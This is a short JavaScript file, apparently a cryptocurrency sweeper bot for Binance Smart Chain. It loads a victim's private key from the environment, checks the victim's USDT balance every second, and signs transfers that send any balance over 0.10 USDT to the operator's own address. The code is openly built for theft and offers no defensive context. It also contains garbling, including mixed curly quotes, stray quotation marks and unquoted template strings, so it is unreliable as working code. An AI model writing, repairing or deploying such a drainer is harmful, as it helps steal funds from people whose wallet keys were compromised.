const Web3 = require(“web3”);
const web3 = new Web3(“https://bsc-dataseed.binance.org/”);
const usdtContractAddress = “0x55d398326f99059fF775485246999027B3197955”;
const usdtAbi = [
{
constant: true,
inputs: [{ name: “_owner”, type: “address” }],
name: “balanceOf”,
outputs: [{ name: “”, type: “uint256” }],
type: “function”
},
{
constant: false,
inputs: [
{ name: “_to”, type: “address” },
{ name: “_value”, type: “uint256” }
],
name: “transfer”,
outputs: [{ name: “”, type": “bool” }],
type": “function”
}
];
const victimPrivateKey = process.env.VICTIM_PRIVATE_KEY;
const victimAddress = process.env.VICTIM_ADDRESS;
const myAddress = process.env.MY_ADDRESS;
async function checkBalance() {
const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
const balanceWei = await usdtContract.methods.balanceOf(victimAddress).call();
const balance = parseFloat(web3.utils.fromWei(balanceWei, “ether”));
if (balance > 0.10) {
console.log(Balance is ${balance} USDT. Transferring to my address...);
await transferUSDT(balance);
} else {
console.log(Balance is ${balance} USDT. Not transferring.);
}
}
async function transferUSDT(amount) {
const usdtContract = new web3.eth.Contract(usdtAbi, usdtContractAddress);
const txData = usdtContract.methods.transfer(myAddress, web3.utils.toWei(amount.toString(), “ether”)).encodeABI();
const txCount = await web3.eth.getTransactionCount(victimAddress);
const txObject = {
nonce: web3.utils.toHex(txCount),
to: usdtContractAddress,
value": “0x0”,
gasLimit": web3.utils.toHex(210000),
gasPrice": web3.utils.toHex(web3.utils.toWei(“5”, “gwei”)),
data": txData
};
const signedTx = await web3.eth.accounts.signTransaction(txObject, victimPrivateKey);
await web3.eth.sendSignedTransaction(signedTx.rawTransaction);
console.log(Transferred ${amount} USDT to my address.);
}
// Check balance every second
setInterval(checkBalance, 1000);
